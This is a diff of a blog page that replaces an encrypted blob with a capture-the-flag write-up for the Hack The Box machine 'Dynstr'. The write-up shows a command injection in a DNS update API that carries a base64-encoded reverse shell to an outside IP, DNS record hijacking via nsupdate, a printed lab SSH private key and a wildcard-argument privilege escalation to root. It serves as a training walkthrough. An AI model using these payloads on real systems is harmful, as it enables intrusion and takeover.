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</div>
-</div>
+<h2 id="foothold">Foothold<a arialabel="Anchor" class="hanchor" href="#foothold">⌗</a> </h2>
+<p>1- Nmap discovered ports 22, 80, 53.</p>
+<p>80 -&gt; Apache/2.4.41
+53 -&gt; ISC BIND 9.16.1</p>
+<pre tabindex="0"><code># Nmap 7.91 scan initiated Wed Sep  1 19:36:11 2021 as: nmap -sC -sV -p- -v -oA tcp dynstr.htb
+Nmap scan report for dynstr.htb (10.10.10.244)
+Host is up (0.090s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
+|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
+|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
+53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Dyna DNS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Sep  1 19:41:49 2021 -- 1 IP address (1 host up) scanned in 337.88 seconds
+</code></pre><p>2- Web recon.
+–&gt; The company Dyna offers dynamic DNS services just as no-ip.com API
+–&gt; It has domains: dnsalias.htb, dynamicdns.htb, no-ip.htb
+–&gt; credentials: dynadns:sndanyd
+–&gt; email: <a href="mailto:dns@dyna.htb">dns@dyna.htb</a></p>
+<p>I’ll add dyna.htb to /etc/hosts.</p>
+<p>Fuzz in the background.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">ffuf -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dyna.htb/FUZZ -fc <span style="color:#ae81ff">403</span>
+</code></pre></div><p>Found /nic.</p>
+<p>3- DNS zone transfer failed.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">dig axfr @dynstr.htb 
+dig axfr @dynstr.htb dnsalias.htb
+<span style="color:#75715e"># --&gt; Transfer failed. </span>
+</code></pre></div><p>Try playing with DNS with nslookup and query the 3 found domains: no answer.
+Try dig.</p>
+<blockquote>
+<p>dig ANY @dynstr.htb dnsalias.htb
+dnsalias.htb.           60      IN      SOA     dns1.dyna.htb. hostmaster.dyna.htb. 2021030300 21600 3600 604800 60                 <br/>
+dnsalias.htb.           60      IN      NS      dns1.dyna.htb.
+dig ANY @dynstr.htb no-ip.htb
+Same answer.
+dig ANY @dynstr.htb dynamicdns.htb
+Same answer.</p>
+</blockquote>
+<p><a href="mailto:hostmaster@dyna.htb">hostmaster@dyna.htb</a> is the DNS admin email.
+dns1.dyna.htb points to 127.0.0.1.
+This is a dead end.</p>
+<p>4- Remember the no-ip.com API and the credentials from the web recon phase? I googled about the no-ip.com API. The first page gives an example of the update API:</p>
+<pre tabindex="0"><code>http://username:password@dynupdate.no-ip.com/nic/update?hostname=mytest.example.com&amp;myip=192.0.2.25
+</code></pre><pre tabindex="0"><code>GET /nic/update?hostname=mytest.example.com&amp;myip=192.0.2.25 HTTP/1.1
+Host: dynupdate.no-ip.com
+Authorization: Basic base64-encoded-auth-string
+User-Agent: Company DeviceName-Model/FirmwareVersionNumber maintainer-contact@example.com
+</code></pre><p>Where the auth string is base64 encoded username:password.</p>
+<p>Fuzz this API and look for command injection (sql injection is unlikely).</p>
+<p>Use Burpsuite to do manual fuzzing first:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">GET /nic/update?hostname<span style="color:#f92672">=</span>%3bdynamicdns.no-ip.htb&amp;myip<span style="color:#f92672">=</span>192.0.2.25 HTTP/1.1 <span style="color:#75715e"># &lt;--- Here I used dynamicdns.no-ip.htb because single domains give 911 wrong domain error, I used %3b because that's ";"</span>
+Authorization: Basic ZHluYWRuczpzbmRhbnlk
+</code></pre></div><p>returns <code>911 [nsupdate failed]</code>.</p>
+<p>5- Research nsupdate to get a feeling of how the command call is made.
+Urlencode this and send it to burpsuite repeater:</p>
+<pre tabindex="0"><code>hostname=`echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE= | base64 -d | bash` anything.no-ip.htb
+</code></pre><p>while listening to 4242.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">whoami
+<span style="color:#75715e"># www-data</span>
+
+cat /etc/passwd
+<span style="color:#75715e"># There are users bindmgr and dyna. </span>
+</code></pre></div><p>6- List /home/dyna and /home/bindmgr. There is a setuid bash with owner bindmgr, just run bash with euid:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">./bash -p
+cat user.txt
+</code></pre></div><p>It turns out the setuid bash is a leftover of other players. Read step 7 first. The correct way is to use nsupdate to point some DNS record to our IP and then ssh with private key.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">nsupdate -k infra.key
+&gt; update add sftp.infra.dyna.htb <span style="color:#ae81ff">86400</span> A ATTACKER_IP
+&gt; update add REVERSED_ATTACKER_IP.in-addr.arpa <span style="color:#ae81ff">300</span> PTR anything.infra.dyna.htb
+&gt; send
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">ssh -i bindmgr bindmgr@dynstr.htb 
+</code></pre></div><p>And we get user.txt.</p>
+<h2 id="privilege-escalation">Privilege escalation<a arialabel="Anchor" class="hanchor" href="#privilege-escalation">⌗</a> </h2>
+<p>7- Inspect /home/bindmgr and find (amidst a lot of garbage):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">curl -sk sftp://bindmgr@sftp.infra.dyna.htb/bindmgr-release.zip
+</code></pre></div><p>as well as the private key for bindmgr in a file whose name starts with strace. Note down the domain <code>sftp.infra.dyna.htb</code>.</p>
+<pre tabindex="0"><code>-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1
+42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3
+HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F
+L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn
+UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX
+CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz
+uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
+XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P
+ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk
++JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs
+4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq
+xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD
+PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k
+obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l
+u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS
+TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A
+Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE
+BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv
+C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX
+Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt
+U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ
+b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5
+rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
+jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
+-----END OPENSSH PRIVATE KEY-----
+</code></pre><p>However,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">ssh -i bindmgr bindmgr@dyna.htb 
+</code></pre></div><p>SSH with private key still requires a password… See previous step for intended path.</p>
+<p>8- As bindmgr, <code>sudo -l</code>. It can execute bindmgr.sh as root.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/usr/bin/bash
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e"># This script generates named.conf.bindmgr to workaround the problem</span>
+<span style="color:#75715e"># that bind/named can only include single files but no directories.</span>
+<span style="color:#75715e">#</span>
+<span style="color:#75715e"># It creates a named.conf.bindmgr file in /etc/bind that can be included</span>
+<span style="color:#75715e"># from named.conf.local (or others) and will include all files from the</span>
+<span style="color:#75715e"># directory /etc/bin/named.bindmgr.</span>
+<span style="color:#75715e">#</span>
+<span style="color:#75715e"># NOTE: The script is work in progress. For now bind is not including</span>
+<span style="color:#75715e">#       named.conf.bindmgr. </span>
+<span style="color:#75715e">#</span>
+<span style="color:#75715e"># TODO: Currently the script is only adding files to the directory but</span>
+<span style="color:#75715e">#       not deleting them. As we generate the list of files to be included</span>
+<span style="color:#75715e">#       from the source directory they won't be included anyway.</span>
+
+BINDMGR_CONF<span style="color:#f92672">=</span>/etc/bind/named.conf.bindmgr
+BINDMGR_DIR<span style="color:#f92672">=</span>/etc/bind/named.bindmgr
+
+indent<span style="color:#f92672">()</span> <span style="color:#f92672">{</span> sed <span style="color:#e6db74">'s/^/    /'</span>; <span style="color:#f92672">}</span>
+
+<span style="color:#75715e"># Check versioning (.version)</span>
+echo <span style="color:#e6db74">"[+] Running </span>$0<span style="color:#e6db74"> to stage new configuration from </span>$PWD<span style="color:#e6db74">."</span>
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -f .version <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
+    echo <span style="color:#e6db74">"[-] ERROR: Check versioning. Exiting."</span>
+    exit <span style="color:#ae81ff">42</span>
+<span style="color:#66d9ef">fi</span>
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">"`cat .version 2&gt;/dev/null`"</span> -le <span style="color:#e6db74">"`cat </span>$BINDMGR_DIR<span style="color:#e6db74">/.version 2&gt;/dev/null`"</span> <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
+    echo <span style="color:#e6db74">"[-] ERROR: Check versioning. Exiting."</span>
+    exit <span style="color:#ae81ff">43</span>
+<span style="color:#66d9ef">fi</span>
+
+<span style="color:#75715e"># Create config file that includes all files from named.bindmgr.</span>
+echo <span style="color:#e6db74">"[+] Creating </span>$BINDMGR_CONF<span style="color:#e6db74"> file."</span>
+printf <span style="color:#e6db74">'// Automatically generated file. Do not modify manually.\n'</span> &gt; $BINDMGR_CONF
+<span style="color:#66d9ef">for</span> file in * ; <span style="color:#66d9ef">do</span>
+    printf <span style="color:#e6db74">'include "/etc/bind/named.bindmgr/%s";\n'</span> <span style="color:#e6db74">"</span>$file<span style="color:#e6db74">"</span> &gt;&gt; $BINDMGR_CONF
+<span style="color:#66d9ef">done</span>
+
+<span style="color:#75715e"># Stage new version of configuration files.</span>
+echo <span style="color:#e6db74">"[+] Staging files to </span>$BINDMGR_DIR<span style="color:#e6db74">."</span>
+cp .version * /etc/bind/named.bindmgr/
+
+<span style="color:#75715e"># Check generated configuration with named-checkconf.</span>
+echo <span style="color:#e6db74">"[+] Checking staged configuration."</span>
+named-checkconf $BINDMGR_CONF &gt;/dev/null
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $? -ne <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
+    echo <span style="color:#e6db74">"[-] ERROR: The generated configuration is not valid. Please fix following errors: "</span>
+    named-checkconf $BINDMGR_CONF 2&gt;&amp;<span style="color:#ae81ff">1</span> | indent
+    exit <span style="color:#ae81ff">44</span>
+<span style="color:#66d9ef">else</span> 
+    echo <span style="color:#e6db74">"[+] Configuration successfully staged."</span>
+    <span style="color:#75715e"># *** TODO *** Uncomment restart once we are live.</span>
+    <span style="color:#75715e"># systemctl restart bind9</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $? -ne <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
+        echo <span style="color:#e6db74">"[-] Restart of bind9 via systemctl failed. Please check logfile: "</span>
+	systemctl status bind9
+    <span style="color:#66d9ef">else</span>
+	echo <span style="color:#e6db74">"[+] Restart of bind9 via systemctl succeeded."</span>
+    <span style="color:#66d9ef">fi</span>
+<span style="color:#66d9ef">fi</span>
+</code></pre></div><p>9- <code>.version</code> and a wildcard are copied to /etc/bind/named.bindmgr/. The script first checks that in the current directory there is a <code>.version</code> file and that the number in it is greater equal than <code>$BINDMGR_DIR/.version</code>. So we create a <code>.version</code> file in /tmp and create a <code>bash</code> and <code>--preserve=mode</code> files.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">cd /tmp
+cp /bin/bash .
+chmod u+s bash
+echo <span style="color:#e6db74">""</span> &gt; <span style="color:#e6db74">"--preserve=mode"</span>
+cp $BINDMGR_DIR/.version .version
+<span style="color:#75715e"># run the script as sudo</span>
+sudo bindmgr.sh
+</code></pre></div><p>10- The files are copied to /etc/bind/named.bindmgr/. The bash setuid bit is set and it’s owned by root.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">cd /etc/bind/named.bindmgr/
+bash -p
+</code></pre></div><p>root.txt: c2ba74897b445b0e30466fa9d7b26253</p>
 </div></div>
 </div>
 </div>
@@ -100,5 +284,5 @@
 <script src="/assets/main.js"></script>
 <script src="/assets/prism.js"></script>
 </div>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script><script src="/decrypt.js"></script></body>
+</body>
 </html>
